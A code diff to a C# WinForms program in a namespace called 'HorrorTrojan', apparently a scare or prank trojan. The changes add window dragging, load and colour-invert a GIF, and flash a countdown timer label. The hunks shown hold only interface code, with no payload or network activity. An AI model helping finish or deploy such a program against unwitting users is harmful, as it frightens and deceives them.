@@ -62,9 +62,19 @@ namespace HorrorTrojan
             this.Load += MainInterface_Load;
             originalBackColor = this.BackColor;
 
+            // ПЕРЕМЕЩЕНИЕ ФОРМЫ (через глобальный перехват)
             this.MouseDown += MainInterface_MouseDown;
             this.MouseMove += MainInterface_MouseMove;
             this.MouseUp += MainInterface_MouseUp;
+            this.pictureBox.MouseDown += MainInterface_MouseDown;
+            this.pictureBox.MouseMove += MainInterface_MouseMove;
+            this.pictureBox.MouseUp += MainInterface_MouseUp;
+            this.bottomPanel.MouseDown += MainInterface_MouseDown;
+            this.bottomPanel.MouseMove += MainInterface_MouseMove;
+            this.bottomPanel.MouseUp += MainInterface_MouseUp;
+            this.timerLabel.MouseDown += MainInterface_MouseDown;
+            this.timerLabel.MouseMove += MainInterface_MouseMove;
+            this.timerLabel.MouseUp += MainInterface_MouseUp;
 
             this.WindowState = FormWindowState.Normal;
             this.Visible = true;
@@ -143,8 +153,9 @@ namespace HorrorTrojan
                 string gifPath = Path.Combine(appDataPath, "hr.gif");
                 if (File.Exists(gifPath))
                 {
+                    // ЗАГРУЖАЕМ GIF ПРЯМО ИЗ ФАЙЛА (НЕ КЛОНИРУЕМ!)
                     originalGifImage = Image.FromFile(gifPath);
-                    gifImage = (Image)originalGifImage.Clone();
+                    gifImage = originalGifImage;
                     this.pictureBox.Image = gifImage;
                     this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
                     ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
@@ -218,11 +229,11 @@ namespace HorrorTrojan
                     this.timerLabel.BackColor = Color.Black;
                     this.timerLabel.ForeColor = Color.Red;
                     
-                    // Возвращаем оригинальный GIF
+                    // Возвращаем оригинальный GIF (перезагружаем)
                     if (originalGifImage != null)
                     {
                         ImageAnimator.StopAnimate(gifImage, (s, ev) => { });
-                        gifImage = (Image)originalGifImage.Clone();
+                        gifImage = originalGifImage;
                         this.pictureBox.Image = gifImage;
                         ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
                     }
@@ -238,11 +249,12 @@ namespace HorrorTrojan
                     this.timerLabel.BackColor = Color.White;
                     this.timerLabel.ForeColor = Color.Cyan;
                     
-                    // Инвертируем GIF
+                    // Инвертируем GIF (СОЗДАЁМ НОВЫЙ BITMAP)
                     if (gifImage != null)
                     {
                         ImageAnimator.StopAnimate(gifImage, (s, ev) => { });
-                        gifImage = InvertImage((Image)gifImage.Clone());
+                        Image invertedGif = InvertImage(gifImage);
+                        gifImage = invertedGif;
                         this.pictureBox.Image = gifImage;
                         ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
                     }
@@ -257,10 +269,10 @@ namespace HorrorTrojan
         {
             try
             {
+                // СОЗДАЁМ НОВОЕ ИЗОБРАЖЕНИЕ С ИНВЕРСИЕЙ
                 Bitmap bmp = new Bitmap(original.Width, original.Height);
                 using (Graphics g = Graphics.FromImage(bmp))
                 {
-                    // Создаем ColorMatrix для инверсии
                     ColorMatrix colorMatrix = new ColorMatrix(new float[][]
                     {
                         new float[] {-1, 0, 0, 0, 0},
@@ -465,14 +477,13 @@ namespace HorrorTrojan
             catch { }
         }
 
-        // ===== ПЕРЕМЕЩЕНИЕ ФОРМЫ =====
+        // ===== ПЕРЕМЕЩЕНИЕ ФОРМЫ (ИСПРАВЛЕНО) =====
         private void MainInterface_MouseDown(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Left)
             {
                 isDragging = true;
                 dragStartPoint = new Point(e.X, e.Y);
-                this.Capture = true;
             }
         }
 
@@ -490,7 +501,6 @@ namespace HorrorTrojan
             if (e.Button == MouseButtons.Left)
             {
                 isDragging = false;
-                this.Capture = false;
             }
         }
 
